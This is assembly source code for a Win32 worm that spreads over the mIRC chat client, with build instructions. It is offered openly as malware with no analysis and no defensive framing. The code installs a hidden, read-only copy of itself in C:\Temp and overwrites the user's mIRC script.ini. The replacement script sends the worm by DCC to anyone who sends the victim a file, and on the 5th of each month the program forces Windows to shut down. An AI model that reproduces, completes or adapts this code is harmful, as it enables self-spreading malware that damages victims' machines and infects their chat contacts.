
;
;   VOYAGER.mIRC.Worm.Win32
;   by Bumblebee/[Hail and Kill]
;
;   . This is a simple mIRC worm. Creates -if not exists- a directory
;   called 'C:\Temp' and stores there 'Voyager.exe'. Then searches for
;   mIRC in 'c:\mirc' and 'c:\mirc32'. If mIRC is found then deletes
;   the 'script.ini' and writes its own script.
;
;   . Sets to 'Voyager.exe' read-only and hidden attributes.
;   . ExitWindows if Voyager is executed in payload date.
;
;   . Is a Win32 program -only uses API- and due to this it must work
;   fine under Win95/Win98/WinNT. Is small but -fucking windows- its
;   size is 4096 bytes long.
;
;       tasm /ml /m3 v32,,;
;       tlink32 -Tpe -c v32,v32,, import32.lib
;

.386
locals
jumps
.model flat,STDCALL

        ; procs to import
        extrn           CreateFileA:PROC
        extrn             WriteFile:PROC
        extrn           CloseHandle:PROC
        extrn           DeleteFileA:PROC
        extrn           ExitProcess:PROC
        extrn       GetCommandLineA:PROC
        extrn  GetCurrentDirectoryA:PROC
        extrn  SetCurrentDirectoryA:PROC
        extrn      CreateDirectoryA:PROC
        extrn          VirtualAlloc:PROC
        extrn             CopyFileA:PROC
        extrn    SetFileAttributesA:PROC
        extrn         GetSystemTime:PROC
        extrn         ExitWindowsEx:PROC

virusSize       equ     4096
scriptSize      equ     endScript-mIRCScript

.DATA
                db      0dh,0ah
id              db      'VOYAGER.mIRC.Worm.Win32 by Bumblebee/[Hail and Kill]',0
                db      0dh,0ah

scriptName      db      'Script.ini',0
virusDir        db      'C:\Temp',0
destVir         db      'C:\Temp\Voyager.exe',0
mIRCScript      db      '[SCRIPT]',0,0dh,0ah
                db      'n0=on 1:TEXT:*sting*:#:/msg $chan VOYAGER.mIRC.Worm.Win32'
                db      ' by Bumblebee/[Hail and Kill] at your service!',0
                db      0dh,0ah
                db      'n1=on 1:TEXT:*bee*:#:/msg $chan The way of the bee!',0
                db      0dh,0ah
                db      'n2=on 1:FILESENT:*.*:/if ( $me != $nick ) { /dcc send'
                db      ' $nick c:\temp\voyager.exe }',0,0dh,0ah
endScript       db      0

mIRCDir0        db      'c:\mirc',0
mIRCDir1        db      'c:\mirc32',0

fHnd            dd      ?
cdirHnd         dd      ?
commandLine     dd      ?
size2Read       dd      0

sysTimeStruct   db      16 dup(0)

.CODE

inicio:

        call    GetCommandLineA         ; get command line
        mov     dword ptr [commandLine],eax

skipArgs:                               ; skip args
        cmp     dword ptr [eax],'EXE.'
        je      argsOk
        inc     eax
        jmp     skipArgs
argsOk:
        add     eax,4
        mov     byte ptr [eax],0

        push    00000004h       ; read/write page
        push    00001000h       ; mem commit (reserve phys mem)
        push    1024            ; size to alloc
        push    0h              ; let system decide where to alloc
        call    VirtualAlloc
        cmp     eax,0
        je      goOut           ; ops... not memory to alloc?
        mov     dword ptr [cdirHnd],eax

        push    dword ptr [cdirHnd]     ; get current directory
        push    1024
        call    GetCurrentDirectoryA
        cmp     eax,0
        je      goErrOut

goDir:
        lea     eax,virusDir
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        jne     skipCreateDir           ; directory exists

        xor     eax,eax
        push    0
        lea     eax,virusDir
        push    eax
        call    CreateDirectoryA        ; create the directory
        cmp     eax,0
        je      goOut
        jmp     goDir

skipCreateDir:

        push    0                       ; overwrite if exists
        lea     eax,destVir
        push    eax
        push    dword ptr [commandLine]
        call    CopyFileA               ; install Voyager into c:\Temp
        cmp     eax,0
        je      mIRCCheck

        push    00000001h OR 00000002h  ; set read only and hidden
        lea     eax,destVir
        push    eax
        call    SetFileAttributesA      ; set voyager new attributes

mIRCCheck:
        lea     eax,mIRCDir0
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        je      installScript           ; directory exists -> mIRC found!

        lea     eax,mIRCDir1
        push    eax
        call    SetCurrentDirectoryA
        cmp     eax,0
        jne     goOut                   ; directory exists -> mIRC found!

installScript:

        lea     eax,scriptName
        push    eax                     ; delete script.ini
        call    DeleteFileA

        xor     eax,eax
        push    eax
        push    00000020h               ; archive
        push    1
        push    eax
        push    00000001h OR 00000002h
        push    40000000h
        lea     eax,scriptName
        push    eax
        call    CreateFileA             ; open new script for write (shared)
        cmp     eax,-1
        je      goOut

        mov     dword ptr [fHnd],eax

        push    0
        mov     dword ptr [size2Read],0
        lea     eax,size2Read
        push    eax
        mov     eax,scriptSize
        push    eax
        lea     eax,mIRCScript
        push    eax
        push    dword ptr [fHnd]
        call    WriteFile              ; write script.ini

        mov     eax,dword ptr [fHnd]   ; close file
        push    eax
        call    CloseHandle


goOut:
        push    dword ptr [cdirHnd]     ; restore work directory
        call    SetCurrentDirectoryA

goErrOut:

        lea     eax,sysTimeStruct       ; check for payload
        push    eax
        call    GetSystemTime

        lea     eax,sysTimeStruct       ; 5th day of month?
        cmp     word ptr [eax+6],5
        jne     exitLoop

        xor     eax,eax
        mov     eax,1
        or      eax,4
        push    eax
        push    eax
        call    ExitWindowsEx           ; close windows ;)

exitLoop:
        push    0h                      ; exit
        call    ExitProcess
        jmp     exitLoop

Ends
End inicio

